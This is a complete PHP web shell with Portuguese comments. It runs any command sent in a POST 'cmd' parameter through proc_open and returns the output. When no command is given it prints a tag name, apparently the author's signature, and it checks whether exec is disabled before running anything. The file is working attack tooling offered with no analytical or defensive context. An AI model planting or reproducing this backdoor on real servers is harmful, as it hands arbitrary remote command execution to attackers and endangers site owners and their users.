<?php  

if (isset($_POST["cmd"])) {
    $cmd = ($_POST["cmd"]); 

    function exec_command($command) {
        // Lista de funções que serão verificadas
        $disabled_functions = explode(',', ini_get('disable_functions'));
        $disabled_functions = array_map('trim', $disabled_functions); // Remove espaços

        // Verifica se a função exec está desabilitada
        if (!in_array('exec', $disabled_functions)) {
            $descriptorspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("file", "error-output.txt", "a")
            ); 
            $cwd = "";
            $env = array('some_option' => 'aeiou');
            $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
            
            if (is_resource($process)) {
                echo stream_get_contents($pipes[1]); 
                fclose($pipes[1]);
                proc_close($process);
            }
        } else {
            echo "A função exec está desabilitada.";
        }
    }

    exec_command($cmd); 
    exit;
} else { 
    echo "RafaelChriss";
}
?>
